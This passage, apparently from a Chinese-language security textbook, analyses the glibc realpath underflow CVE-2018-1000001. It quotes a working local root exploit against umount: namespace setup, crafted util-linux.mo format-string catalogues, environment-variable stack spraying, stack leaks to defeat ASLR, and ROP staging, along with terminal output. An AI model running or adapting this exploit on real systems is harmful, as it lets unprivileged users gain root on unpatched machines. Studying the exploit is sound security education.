},
(char*[]){"1234", stackDumpStr, "5678"},
3); // 伪造一个 catalogue，将上面的 stackDumpStr 格式化字符
串写进去
[...]
result=snprintf(pathBuffer, sizeof(pathBuffer),
"%s/(unreachable)/tmp/%s/X.X/LC_MESSAGES/util-linux.mo",
namespaceMountBaseDir, osReleaseExploitData[2]);
secondPhaseTriggerPipePathname=strdup(pathBuffer); // 创建文件
[...]
result=snprintf(pathBuffer, sizeof(pathBuffer),
"%s/(unreachable)/tmp/%s/X.x/LC_MESSAGES/util-linux.mo",
namespaceMountBaseDir, osReleaseExploitData[2]);
secondPhaseCataloguePathname=strdup(pathBuffer); // 创建
文件
return(namespacedProcessPid); // 返回子进程 ID
1583
7.1.5 CVE–2018-1000001 glibc realpath 缓冲区下溢漏洞
}
所创建的各种类型文件如下：
$ find /proc/10173/cwd/ -type d
/proc/10173/cwd/
/proc/10173/cwd/(unreachable)
/proc/10173/cwd/(unreachable)/tmp
/proc/10173/cwd/(unreachable)/tmp/_nl_load_locale_from_archive
/proc/10173/cwd/(unreachable)/tmp/_nl_load_locale_from_archive/X
.x
/proc/10173/cwd/(unreachable)/tmp/_nl_load_locale_from_archive/X
.x/LC_MESSAGES
/proc/10173/cwd/(unreachable)/tmp/_nl_load_locale_from_archive/X
.X
/proc/10173/cwd/(unreachable)/tmp/_nl_load_locale_from_archive/X
.X/LC_MESSAGES
/proc/10173/cwd/(unreachable)/tmp/_nl_load_locale_from_archive/C
.UTF-8
/proc/10173/cwd/(unreachable)/tmp/_nl_load_locale_from_archive/C
.UTF-8/LC_MESSAGES
/proc/10173/cwd/(unreachable)/x
$ find /proc/10173/cwd/ -type f
/proc/10173/cwd/DATEMSK
/proc/10173/cwd/(unreachable)/tmp/_nl_load_locale_from_archive/C
.UTF-8/LC_MESSAGES/util-linux.mo
/proc/10173/cwd/ready
$ find /proc/10173/cwd/ -type l
/proc/10173/cwd/(unreachable)/tmp/down
$ find /proc/10173/cwd/ -type p
/proc/10173/cwd/(unreachable)/tmp/_nl_load_locale_from_archive/X
.X/LC_MESSAGES/util-linux.mo
然后在父进程里可以对子进程进行设置，通过设置 setgroups 为 deny，可以限
制在新 namespace 里面调用 setgroups() 函数来设置 groups；通过设置
uid_map 和 gid_map ，可以让子进程自己设置好挂载点。结果如下：
1584
7.1.5 CVE–2018-1000001 glibc realpath 缓冲区下溢漏洞
$ cat /proc/10173/setgroups
deny
$ cat /proc/10173/uid_map
0 999 1
$ cat /proc/10173/gid_map
0 999 1
这样准备工作就做好了。进入第二部分 attemptEscalation() 函数：
int attemptEscalation() {
[...]
pid_t childPid=fork();
if(!childPid) {
[...]
result=chdir(targetCwd); // 改变当前工作目录为 targetCwd
// Create so many environment variables for a kind of "stack spr
aying".
int envCount=UMOUNT_ENV_VAR_COUNT;
char **umountEnv=(char**)malloc((envCount+1)*sizeof(char*));
umountEnv[envCount--]=NULL;
umountEnv[envCount--]="LC_ALL=C.UTF-8";
while(envCount>=0) {
umountEnv[envCount--]="AANGUAGE=X.X"; // 喷射栈的上部
}
// Invoke umount first by overwriting heap downwards using links
// for "down", then retriggering another error message ("busy")
// with hopefully similar same stack layout for other path "/".
char* umountArgs[]={umountPathname, "/", "/", "/", "/", "/",
"/", "/", "/", "/", "/", "down", "LABEL=78", "LABEL=789", "LABEL
=789a", "LABEL=789ab", "LABEL=789abc", "LABEL=789abcd", "LABEL=7
89abcde", "LABEL=789abcdef", "LABEL=789abcdef0", "LABEL=789abcde
f0", NULL};
result=execve(umountArgs[0], umountArgs, umountEnv);
}
[...]
int escalationPhase=0;
[...]
while(1) {
1585
7.1.5 CVE–2018-1000001 glibc realpath 缓冲区下溢漏洞
if(escalationPhase==2) { // 阶段 2 => case 3
result=waitForTriggerPipeOpen(secondPhaseTriggerPipePathna
me);
[...]
escalationPhase++;
}
// Wait at most 10 seconds for IO.
result=poll(pollFdList, 1, 10000);
[...]
// Perform the IO operations without blocking.
if(pollFdList[0].revents&(POLLIN|POLLHUP)) {
result=read(
pollFdList[0].fd, readBuffer+readDataLength,
sizeof(readBuffer)-readDataLength);
[...]
readDataLength+=result;
// Handle the data depending on escalation phase.
int moveLength=0;
switch(escalationPhase) {
case 0: // Initial sync: read A*8 preamble. // 阶段 0
，读取我们精心构造的 util-linux.mo 文件中的格式化字符串。成功写入 8*'A'
的 preamble
[...]
char *preambleStart=memmem(readBuffer, readDataLength,
"AAAAAAAA", 8); // 查找内存，设置 preambleStart
[...]
// We found, what we are looking for. Start reading the stack.
escalationPhase++; // 阶段加 1 => case 1
moveLength=preambleStart-readBuffer+8;
case 1: // Read the stack. // 阶段 1，利用格式化字符串
读出栈数据，计算出 libc 等有用的地址以对付 ASLR
// Consume stack data until or local array is full.
while(moveLength+16 case 2
char *escalationString=(char*)malloc(1024); //
将下一阶段的格式化字符串写入到另一个 util-linux.mo 中
createStackWriteFormatString(
escalationString, 1024,
exploitOffsets[ED_STACK_OFFSET_ARGV]+1, // Stack p
osition of argv pointer argument for fprintf
sourcePointerTarget, // Base value to write
exploitOffsets[ED_STACK_OFFSET_ARG0]+1, // Stack p
osition of argv[0] pointer ...
libcStartFunctionReturnAddressSource,
(unsigned short*)stackWriteData,
sizeof(stackWriteData)/sizeof(unsigned short)
);
fprintf(stderr, "Using escalation string %s", escalati
onString);
result=writeMessageCatalogue(
secondPhaseCataloguePathname,
(char*[]){
"%s: mountpoint not found",
"%s: not mounted",
"%s: target is busy\n (In some cases us
eful info about processes that\n use the device is found
by lsof(8) or fuser(1).)"
},
(char*[]){
escalationString,
"BBBB5678%3$s\n",
1588
7.1.5 CVE–2018-1000001 glibc realpath 缓冲区下溢漏洞
"BBBBABCD%s\n"},
3);
break;
case 2: // 阶段 2，修改了参数 “LANGUAGE”，从而触发了 util
-linux.mo 的重新读入，然后将新的格式化字符串写入到另一个 util-linux.mo 中
case 3: // 阶段 3，读取 umount 的输出以避免阻塞进程，同时
等待 ROP 执行 fchown/fchmod 修改权限和所有者，最后退出
// Wait for pipe connection and output any result from mount.
readDataLength=0;
break;
[...]
}
if(moveLength) {
memmove(readBuffer, readBuffer+moveLength, readDataLengt
h-moveLength);
readDataLength-=moveLength;
}
}
}
attemptEscalationCleanup:
[...]
return(escalationSuccess);
}
通过栈喷射在内存中放置大量的 "AANGUAGE=X.X" 环境变量，这些变量位于栈的
上部，包含了大量的指针。当运行 umount 时，很可能会调用到 realpath() 并
造成下溢。umount 调用 setlocale 设置 locale，接着调用 realpath() 检查
路径的过程如下：
/*
* Check path -- non-root user should not be able to resolve pat
h which is
* unreadable for him.
*/
static char *sanitize_path(const char *path)
{
1589
7.1.5 CVE–2018-1000001 glibc realpath 缓冲区下溢漏洞
[...]
p = canonicalize_path_restricted(path); // 该函数会调用 rea
lpath()，并返回绝对地址
[...]
return p;
}
int main(int argc, char **argv)
{
[...]
setlocale(LC_ALL, ""); // 设置 locale，LC_ALL 变量的值会覆盖
掉 LANG 和所有 LC_* 变量的值
[...]
if (all) {
[...]
} else if (argc 
char *setlocale(int category, const char *locale);
// util-linux/lib/canonicalize.c
char *canonicalize_path_restricted(const char *path)
{
[...]
canonical = realpath(path, NULL);
[...]
return canonical;
}
因为所布置的环境变量是错误的（正确的应为 "LANGUAGE=X.X"），程序会打印